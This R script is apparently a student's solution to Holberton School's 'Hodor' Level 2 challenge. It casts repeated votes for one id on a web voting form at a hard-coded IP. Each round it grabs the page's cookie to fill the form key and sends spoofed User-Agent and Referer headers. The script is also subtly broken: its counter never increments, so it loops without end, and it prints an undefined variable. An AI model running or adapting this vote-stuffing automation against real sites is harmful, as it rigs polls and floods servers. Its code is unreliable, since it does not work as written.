# ===---Description------------------------------------------------------------===
#   Solution for the Hodor Project, Level 2 by Julien Barbier.
#   Using a R Language script with httr library.
#   To run this file you need to install R language.
#   You can run it using interactive(R console) or non interactive(Rscript)
#   sessions:
#   - Interactive:
#   $ R
#   > source("nameoffile.r")
#   - Non Interactive:
#   $ Rscript nameofthefile.r
#
#   by Alexandro de Oliveira, for Holberton School
# ===---------------------------------------------------------------------------===

library('httr')

url     <- "http://173.246.108.142/level2.php"
header  <- add_headers("User-Agent" = "Windows NT 5.1 - havk64 R Language Requests", "Referer" = url)
count   <- 0L
# Get number from user:
cat("How many votes? => ")
total   <- as.integer(readLines("stdin", 1))

while(count < total) {
    head    <- HEAD(url)            # Head request
    cookie  <- cookies(head)$value
    # cat(cookie[2], "\n") # Print the cookie
    body    <- list(id = "23", holdthedoor = "submit", key = cookie[2])
    p       <- POST(url, body = body, encode = "form", header)
    # To print the body:
    # s <- content(p, "text", encoding = 'UTF8')[1]
    # cat(s, "\n")
    match    <- headers(p)$`set-cookie`
    if(!is.null(match)) {
        cat("Vote number: ", i , "\n")
    } else {
        cat( "Failed...", "\n")
    }
}
